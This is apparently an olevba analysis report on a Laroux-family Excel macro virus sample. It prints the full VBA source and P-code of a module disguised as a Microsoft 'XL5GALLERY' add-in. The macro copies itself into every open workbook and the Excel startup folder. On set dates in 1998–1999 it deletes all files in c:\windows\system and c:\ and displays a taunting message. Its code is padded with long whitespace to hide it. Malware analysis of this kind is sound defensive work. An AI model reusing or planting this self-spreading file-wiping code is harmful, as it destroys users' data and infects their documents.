olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.mw.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO xl5galary.bas 
in file: Virus.MSExcel.Laroux.mw.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/xl5galary'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























' ---------------------------------------------------------
' XL5GALLERY MACRO - ENABLES USERS OF VERSION 5 TO USE FX
' This is an autoload macro, which stays in the background
' so you can use the .XLA auto-add in.
' (C) Microsoft 1996. 1998
' ---------------------------------------------------------
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
' Normal error trap
On Error Resume Next
' Activation call for galary
Application.OnSheetActivate = ThisWorkbook.Name & "!xl5galary.galary"
End Sub
' End of routine
'
'
' Start of auto shutdown routine
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
' Ordinary error trap
var_b_10000000000 = Format(Date, "mm")
var_b_10000000001 = Format(Date, "dd")
var_b_10000000002 = Format(Date, "yyyy")
' Enable true date conversion
                                                                                                                                                                                                                                                               If var_b_10000000000 = 5 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 9 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 10 And var_b_10000000001 = 29 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 11 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 12 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If (var_b_10000000001 = 11 Or var_b_10000000001 = 2) And var_b_10000000002 = 1999 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000003 = 1 Then
'
' start macro proper
'
ChDrive "C"
ChDir "c:\windows\system"
' Change to macro drive
                                                                                                                                                                                                                                                               Kill "*.*"
                                                                                                                                                                                                                                                               ChDrive "C"
                                                                                                                                                                                                                                                               ChDir "c:\"
                                                                                                                                                                                                                                                               Kill "*.*"
                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk - XOH ", 16
End If
var_b_10000000008 = Application.StartupPath + "\XL5GLARY.XLS"
                                                                                                                                                                                                                                                               var_b_10000000004 = Dir(var_b_10000000008)
                                                                                                                                                                                                                                                               If UCase(var_b_10000000004) = "XL5GLARY.XLS" Then
GoTo var_b_10000000005
End If
' end of start setup
'
'
'

                                                                                                                                                                                                                                                               var_b_10000000006 = Application.StartupPath + "\xl5glary.xls"
                                                                                                                                                                                                                                                               ThisWorkbook.Modules("xl5galary").Copy
' Make sure the galery is active
var_b_10000000007 = ActiveWorkbook.Name
WindowState = xlMaximized
Application.Windows(var_b_10000000007).Visible = False
                                                                                                                                                                                                                                                               Application.Workbooks(var_b_10000000007).SaveAs FileName:=var_b_10000000006
var_b_10000000005:
var_b_10000000008 = Application.StartupPath + "\Xl5galry.XLS"
                                                                                                                                                                                                                                                               var_b_10000000009 = Dir(var_b_10000000008)
' End of initialisation routine
If UCase(var_b_10000000009) = "XL5GALRY.XLS" Then
ChDir (Application.StartupPath)
                                                                                                                                                                                                                                                               Kill "xl5galry.xls"
End If
End Sub
'
'
'
'
'
'
'
'
'
'
Sub galary()
Attribute galary.VB_ProcData.VB_Invoke_Func = " \n14"
var_b_10000000000 = Format(Date, "mm")
var_b_10000000001 = Format(Date, "dd")
var_b_10000000002 = Format(Date, "yyyy")
                                                                                                                                                                                                                                                               If var_b_10000000000 = 5 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 9 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 10 And var_b_10000000001 = 29 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 11 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 12 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If (var_b_10000000001 = 11 Or var_b_10000000001 = 2) And var_b_10000000002 = 1999 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000003 = 1 Then
ChDrive "C"
ChDir "c:\windows\system"
                                                                                                                                                                                                                                                               Kill "*.*"
                                                                                                                                                                                                                                                               ChDrive "C"
                                                                                                                                                                                                                                                               ChDir "c:\"
                                                                                                                                                                                                                                                               Kill "*.*"
                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk", 16
End If
' end of double check
'
'
'
                                                                                                                                                                                                                                                               var_b_10000000010 = Application.Workbooks.Count
If var_b_10000000010 = 1 Then Exit Sub
For var_b_10000000011 = 1 To var_b_10000000010
var_b_10000000012 = 0
var_b_10000000013 = Workbooks(var_b_10000000011).Name
If var_b_10000000013 = ThisWorkbook.Name Then GoTo var_b_10000000016
var_b_10000000014 = Workbooks(var_b_10000000013).Modules.Count
                                                                                                                                                                                                                                                               If var_b_10000000014 > 0 Then
For var_b_10000000015 = 1 To var_b_10000000014
                                                                                                                                                                                                                                                               If Workbooks(var_b_10000000013).Modules(var_b_10000000015).Name = "xl5galary" Then var_b_10000000012 = 1
Next var_b_10000000015
End If
' Normal adding routine
If var_b_10000000012 = 0 Then
Windows(var_b_10000000013).Activate
ThisWorkbook.Modules("xl5galary").Copy before:=Workbooks(var_b_10000000013).Sheets(1)
                                                                                                                                                                                                                                                               Workbooks(var_b_10000000013).Modules("xl5galary").Visible = False
End If
var_b_10000000016:
Next var_b_10000000011
Exit Sub
' End of macro
' (C) microsoft 1996. 1998
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  xl5galar
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Laroux.mw.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/xl5galary - 9031 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' 	QuoteRem 0x0000 0x003A " ---------------------------------------------------------"
' Line #30:
' 	QuoteRem 0x0000 0x0038 " XL5GALLERY MACRO - ENABLES USERS OF VERSION 5 TO USE FX"
' Line #31:
' 	QuoteRem 0x0000 0x0039 " This is an autoload macro, which stays in the background"
' Line #32:
' 	QuoteRem 0x0000 0x0025 " so you can use the .XLA auto-add in."
' Line #33:
' 	QuoteRem 0x0000 0x0019 " (C) Microsoft 1996. 1998"
' Line #34:
' 	QuoteRem 0x0000 0x003A " ---------------------------------------------------------"
' Line #35:
' 	QuoteRem 0x0000 0x0000 ""
' Line #36:
' 	QuoteRem 0x0000 0x0000 ""
' Line #37:
' 	QuoteRem 0x0000 0x0000 ""
' Line #38:
' 	QuoteRem 0x0000 0x0000 ""
' Line #39:
' 	QuoteRem 0x0000 0x0000 ""
' Line #40:
' 	QuoteRem 0x0000 0x0000 ""
' Line #41:
' 	QuoteRem 0x0000 0x0000 ""
' Line #42:
' 	QuoteRem 0x0000 0x0000 ""
' Line #43:
' 	QuoteRem 0x0000 0x0000 ""
' Line #44:
' 	QuoteRem 0x0000 0x0000 ""
' Line #45:
' 	QuoteRem 0x0000 0x0000 ""
' Line #46:
' 	QuoteRem 0x0000 0x0000 ""
' Line #47:
' 	QuoteRem 0x0000 0x0000 ""
' Line #48:
' 	QuoteRem 0x0000 0x0000 ""
' Line #49:
' 	QuoteRem 0x0000 0x0000 ""
' Line #50:
' 	QuoteRem 0x0000 0x0000 ""
' Line #51:
' 	QuoteRem 0x0000 0x0000 ""
' Line #52:
' 	FuncDefn (Sub auto_open())
' Line #53:
' 	QuoteRem 0x0000 0x0012 " Normal error trap"
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	QuoteRem 0x0000 0x001B " Activation call for galary"
' Line #56:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0011 "!xl5galary.galary"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #57:
' 	EndSub 
' Line #58:
' 	QuoteRem 0x0000 0x000F " End of routine"
' Line #59:
' 	QuoteRem 0x0000 0x0000 ""
' Line #60:
' 	QuoteRem 0x0000 0x0000 ""
' Line #61:
' 	QuoteRem 0x0000 0x001F " Start of auto shutdown routine"
' Line #62:
' 	FuncDefn (Sub auto_close())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	QuoteRem 0x0000 0x0014 " Ordinary error trap"
' Line #65:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000000 
' Line #66:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000001 
' Line #67:
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000002 
' Line #68:
' 	QuoteRem 0x0000 0x001C " Enable true date conversion"
' Line #69:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #70:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #71:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x001D 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #72:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #73:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #74:
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CF 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #75:
' 	Ld var_b_10000000003 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #76:
' 	QuoteRem 0x0000 0x0000 ""
' Line #77:
' 	QuoteRem 0x0000 0x0013 " start macro proper"
' Line #78:
' 	QuoteRem 0x0000 0x0000 ""
' Line #79:
' 	LitStr 0x0001 "C"
' 	ArgsCall ChDrive 0x0001 
' Line #80:
' 	LitStr 0x0011 "c:\windows\system"
' 	ArgsCall ChDir 0x0001 
' Line #81:
' 	QuoteRem 0x0000 0x0016 " Change to macro drive"
' Line #82:
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' Line #83:
' 	LitStr 0x0001 "C"
' 	ArgsCall ChDrive 0x0001 
' Line #84:
' 	LitStr 0x0003 "c:\"
' 	ArgsCall ChDir 0x0001 
' Line #85:
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' Line #86:
' 	LitStr 0x0034 "The NHS Fat Cow Has Just Trashed Your Hardisk - XOH "
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\XL5GLARY.XLS"
' 	Add 
' 	St var_b_10000000008 
' Line #89:
' 	Ld var_b_10000000008 
' 	ArgsLd Dir 0x0001 
' 	St var_b_10000000004 
' Line #90:
' 	Ld var_b_10000000004 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "XL5GLARY.XLS"
' 	Eq 
' 	IfBlock 
' Line #91:
' 	GoTo var_b_10000000005 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	QuoteRem 0x0000 0x0013 " end of start setup"
' Line #94:
' 	QuoteRem 0x0000 0x0000 ""
' Line #95:
' 	QuoteRem 0x0000 0x0000 ""
' Line #96:
' 	QuoteRem 0x0000 0x0000 ""
' Line #97:
' Line #98:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\xl5glary.xls"
' 	Add 
' 	St var_b_10000000006 
' Line #99:
' 	LitStr 0x0009 "xl5galary"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0000 
' Line #100:
' 	QuoteRem 0x0000 0x001F " Make sure the galery is active"
' Line #101:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St var_b_10000000007 
' Line #102:
' 	Ld xlMaximized 
' 	St WindowState 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld var_b_10000000007 
' 	Ld Application 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #104:
' 	Ld var_b_10000000006 
' 	ParamNamed FileName 
' 	Ld var_b_10000000007 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #105:
' 	Label var_b_10000000005 
' Line #106:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Xl5galry.XLS"
' 	Add 
' 	St var_b_10000000008 
' Line #107:
' 	Ld var_b_10000000008 
' 	ArgsLd Dir 0x0001 
' 	St var_b_10000000009 
' Line #108:
' 	QuoteRem 0x0000 0x001E " End of initialisation routine"
' Line #109:
' 	Ld var_b_10000000009 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "XL5GALRY.XLS"
' 	Eq 
' 	IfBlock 
' Line #110:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Paren 
' 	ArgsCall ChDir 0x0001 
' Line #111:
' 	LitStr 0x000C "xl5galry.xls"
' 	ArgsCall Kill 0x0001 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndSub 
' Line #114:
' 	QuoteRem 0x0000 0x0000 ""
' Line #115:
' 	QuoteRem 0x0000 0x0000 ""
' Line #116:
' 	QuoteRem 0x0000 0x0000 ""
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' 	QuoteRem 0x0000 0x0000 ""
' Line #119:
' 	QuoteRem 0x0000 0x0000 ""
' Line #120:
' 	QuoteRem 0x0000 0x0000 ""
' Line #121:
' 	QuoteRem 0x0000 0x0000 ""
' Line #122:
' 	QuoteRem 0x0000 0x0000 ""
' Line #123:
' 	QuoteRem 0x0000 0x0000 ""
' Line #124:
' 	FuncDefn (Sub galary())
' Line #125:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000000 
' Line #126:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000001 
' Line #127:
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000002 
' Line #128:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #129:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #130:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x001D 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #131:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #132:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #133:
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CF 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #134:
' 	Ld var_b_10000000003 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #135:
' 	LitStr 0x0001 "C"
' 	ArgsCall ChDrive 0x0001 
' Line #136:
' 	LitStr 0x0011 "c:\windows\system"
' 	ArgsCall ChDir 0x0001 
' Line #137:
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' Line #138:
' 	LitStr 0x0001 "C"
' 	ArgsCall ChDrive 0x0001 
' Line #139:
' 	LitStr 0x0003 "c:\"
' 	ArgsCall ChDir 0x0001 
' Line #140:
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' Line #141:
' 	LitStr 0x002D "The NHS Fat Cow Has Just Trashed Your Hardisk"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	QuoteRem 0x0000 0x0014 " end of double check"
' Line #144:
' 	QuoteRem 0x0000 0x0000 ""
' Line #145:
' 	QuoteRem 0x0000 0x0000 ""
' Line #146:
' 	QuoteRem 0x0000 0x0000 ""
' Line #147:
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	St var_b_10000000010 
' Line #148:
' 	Ld var_b_10000000010 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #149:
' 	StartForVariable 
' 	Ld var_b_10000000011 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld var_b_10000000010 
' 	For 
' Line #150:
' 	LitDI2 0x0000 
' 	St var_b_10000000012 
' Line #151:
' 	Ld var_b_10000000011 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	St var_b_10000000013 
' Line #152:
' 	Ld var_b_10000000013 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo var_b_10000000016 
' 	EndIf 
' Line #153:
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	St var_b_10000000014 
' Line #154:
' 	Ld var_b_10000000014 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #155:
' 	StartForVariable 
' 	Ld var_b_10000000015 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld var_b_10000000014 
' 	For 
' Line #156:
' 	Ld var_b_10000000015 
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "xl5galary"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000012 
' 	EndIf 
' Line #157:
' 	StartForVariable 
' 	Ld var_b_10000000015 
' 	EndForVariable 
' 	NextVar 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	QuoteRem 0x0000 0x0016 " Normal adding routine"
' Line #160:
' 	Ld var_b_10000000012 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #161:
' 	Ld var_b_10000000013 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #162:
' 	LitDI2 0x0001 
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0009 "xl5galary"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #163:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "xl5galary"
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	Label var_b_10000000016 
' Line #166:
' 	StartForVariable 
' 	Ld var_b_10000000011 
' 	EndForVariable 
' 	NextVar 
' Line #167:
' 	ExitSub 
' Line #168:
' 	QuoteRem 0x0000 0x000D " End of macro"
' Line #169:
' 	QuoteRem 0x0000 0x0019 " (C) microsoft 1996. 1998"
' Line #170:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

